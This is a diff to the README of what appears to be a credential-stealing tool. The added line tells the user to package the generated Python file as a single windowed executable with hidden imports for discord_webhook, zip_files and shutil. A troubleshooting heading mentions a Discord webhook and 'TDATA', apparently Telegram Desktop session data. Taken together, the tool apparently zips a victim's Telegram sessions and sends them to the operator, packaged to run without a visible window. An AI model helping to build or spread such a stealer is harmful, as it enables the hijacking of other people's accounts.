@@ -28,7 +28,7 @@ You can convert (generated_file.py) into exe with auto_py_to_exe:
 pip install auto_py_to_exe
 python -m auto_py_to_exe
 ```
-Then choose (generated_file.py) also I recommend make it --onefile and --windowed
+Then choose (generated_file.py) also I recommend make it --onefile and --windowed, then go to advanced find --hidden-import add discord_webhook, zip_files, shutil. Now you clear to start converting file
 
 ## Problems
 ### IF YOU DONT GET MESSAGE CHECK YOUR DISCORD_WEBHOOK URL ALSO IT CAN CAUSE OF LARGE TDATA
